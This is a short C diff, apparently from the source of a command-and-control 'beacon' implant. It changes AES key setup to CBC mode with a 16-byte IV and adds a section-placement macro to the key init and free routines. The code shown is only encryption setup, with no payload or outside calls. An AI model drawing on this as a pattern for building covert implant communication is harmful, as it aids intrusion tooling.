@@ -6,7 +6,7 @@
  *
 -*/
 
-#include "common.h"
+#include "../common.h"
 
 /*-
  *
@@ -17,9 +17,10 @@
  * Creates the key object for AES
  *
 -*/
-BOOL CryptAesInit( PBEACON_INSTANCE Ins )
+DEFINESEC(B) BOOL CryptAesInit( PBEACON_INSTANCE Ins )
 {
-	UCHAR Str[MAX_PATH];
+	UCHAR Str[16];
+	DWORD Cbc = CRYPT_MODE_CBC;
 
 	if ( Ins->api.CryptAcquireContext( &Ins->key[1].Provider, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
 	{
@@ -44,7 +45,10 @@ BOOL CryptAesInit( PBEACON_INSTANCE Ins )
 
 			if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_IV, Str, 0 ) )
 			{
-				return TRUE;
+				if ( Ins->api.CryptSetKeyParam( Ins->key[1].Key, KP_MODE, CPTR( &Cbc ), 0 ) )
+				{
+					return TRUE;
+				};
 			};
 			Ins->api.CryptDestroyKey( Ins->key[1].Key );
 		};
@@ -62,7 +66,7 @@ BOOL CryptAesInit( PBEACON_INSTANCE Ins )
  * Free's the associated keys for AES
  *
 -*/
-VOID CryptAesFree( PBEACON_INSTANCE Ins )
+DEFINESEC(B) VOID CryptAesFree( PBEACON_INSTANCE Ins )
 {
 	Ins->api.CryptDestroyKey( Ins->key[1].Key );
 	Ins->api.CryptReleaseContext( Ins->key[1].Provider, 0 );
